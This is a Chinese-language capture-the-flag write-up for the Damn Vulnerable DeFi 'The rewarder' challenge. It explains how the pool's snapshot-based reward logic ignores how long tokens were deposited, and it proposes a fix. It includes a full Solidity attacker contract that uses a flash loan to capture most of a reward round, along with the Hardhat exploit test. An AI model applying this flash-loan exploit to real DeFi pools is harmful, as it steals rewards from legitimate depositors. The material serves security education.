![https://images.unsplash.com/photo-1554134449-8ad2b1dea29e?ixlib=rb-4.0.3&q=80&fm=jpg&crop=entropy&cs=tinysrgb](https://images.unsplash.com/photo-1554134449-8ad2b1dea29e?ixlib=rb-4.0.3&q=80&fm=jpg&crop=entropy&cs=tinysrgb)

# 💰 Challenge #5 - The rewarder

題目： There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/the-rewarder)

- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/the-rewarder/the-rewarder.challenge.js)

## 思考切入點

題目說有一個資金池會定期發送獎勵給存 DVT tokens 的人，我們目前沒有任何資金但是有免費的 flashloan 可以借出 DVT tokens，我們的目標是要獲得一些獎勵。

## 合約研讀

這一題牽涉到的合約滿多的，但其時沒有很複雜，首先總共有兩個資金池合約、3 的代幣合約 - 資金池合約 - `TheRewarderPool.sol`：負責存款、發送獎勵的合約 - `FlashLoanerPool.sol`：負責閃電貸可以借錢 - Token Contracts - `AccountingToken.sol`：作為存款憑證的 Token - `RewardToken.sol`：作為獎勵的 Token - `DamnValuableToken.sol`: 接受作為存款的 Token 首先我們先研究一下怎麼獲取獎勵，在 `TheRewarderPool.sol` 中負責發放獎勵的是 `distributeRewards` 這個 function，只要有存款就可以獲得獎勵，並沒有限制存款要晚多久，`isNewRewardsRound()` 檢查是否到了發放時間（5天），所以基本上我們可以到了發放時間趕快存款進去就可以獲得獎勵。那要怎麼觸發 `distributeRewards` 呢？

```jsx
    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if (isNewRewardsRound()) { // 檢查是否到了發放時間（5天），沒找到可以找到誤導時間的方法，所以只能乖乖等時間過去
            _recordSnapshot();
        }

        uint256 totalDeposits = accToken.totalSupplyAt(
            lastSnapshotIdForRewards
        );
        uint256 amountDeposited = accToken.balanceOfAt(
            msg.sender,
            lastSnapshotIdForRewards
        );

        if (amountDeposited > 0 && totalDeposits > 0) {
            // 😈 只要有存款就可以獲得獎勵
            rewards = (amountDeposited * 100 * 10**18) / totalDeposits;
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;
    }
```

`distributeRewards` 在deposit中被觸發，所以我們只需要想辦法在要發放獎勵的時間存錢就可以完成本次攻擊了！

```jsx
    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        // 可以存 DVT Token 獲得 accToken
        require(amountToDeposit > 0, "Must deposit tokens");

        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(
                msg.sender,
                address(this),
                amountToDeposit
            )
        );
    }
```

## 實現攻擊

### 準備攻擊合約

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    address owner;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _liquidityToken,
        address _rewardPool,
        address _loanPool,
        address _accToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_accToken);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount); // 借錢
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this))); // 把錢轉給自己
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount); // 存錢，會自動觸發 distributeRewards 所以我們存完就可以獲得獎勵
        rewardPool.withdraw(amount); // 取錢
        liquidityToken.transfer(address(loanPool), amount); // 還錢給閃電貸
    }
}
```

### 完成測試

```jsx
    it('Exploit', async function () {
        const rewarderAttacker = await (await ethers.getContractFactory('RewarderAttacker', attacker)).deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await rewarderAttacker.attack(TOKENS_IN_LENDER_POOL)
    });
```

## 🔧 弱點總結 & 修改方式

**弱點：** 這題屬於[[套利攻擊]]，算是存款獎勵設想的不夠周全，導致使用者的存款時間多寡不會影響到他們獎勵的多寡。 - **攻擊：** 在要發放獎勵得時間點，通過閃電貸借錢衝進去 `deposit` 並觸發 `distributeRewards` ，馬上套利成功，立刻還錢並把獎勵裝給自己。 - **改進：** 可以參考 Compound 的利息設計機制，在存款的時候設定一個 index，並在發放獎勵的時候比較 index，算算從使用者存款到發放獎勵的時間總共過去幾個 block，想辦法比較出存款時長，並在滿足存款時長才發放獎勵。

## 完整合約

- TheRewarderPool

```jsx
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract TheRewarderPool {
    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        // 可以存 DVT Token 獲得 accToken
        require(amountToDeposit > 0, "Must deposit tokens");

        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(
                msg.sender,
                address(this),
                amountToDeposit
            )
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accToken.totalSupplyAt(
            lastSnapshotIdForRewards
        );
        uint256 amountDeposited = accToken.balanceOfAt(
            msg.sender,
            lastSnapshotIdForRewards
        );

        if (amountDeposited > 0 && totalDeposits > 0) {
            // 😈 只要有存款就可以獲得獎勵
            rewards = (amountDeposited * 100 * 10**18) / totalDeposits;
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (lastRewardTimestamps[account] >=
            lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION);
    }

    function isNewRewardsRound() public view returns (bool) {
        return
            block.timestamp >=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}

```

- RewarderAttacker

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    address owner;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _liquidityToken,
        address _rewardPool,
        address _loanPool,
        address _accToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_accToken);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
    }
}

```

- 測試

```jsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');

        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {
        const rewarderAttacker = await (await ethers.getContractFactory('RewarderAttacker', attacker)).deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await rewarderAttacker.attack(TOKENS_IN_LENDER_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);

            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }

        // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });

});

```
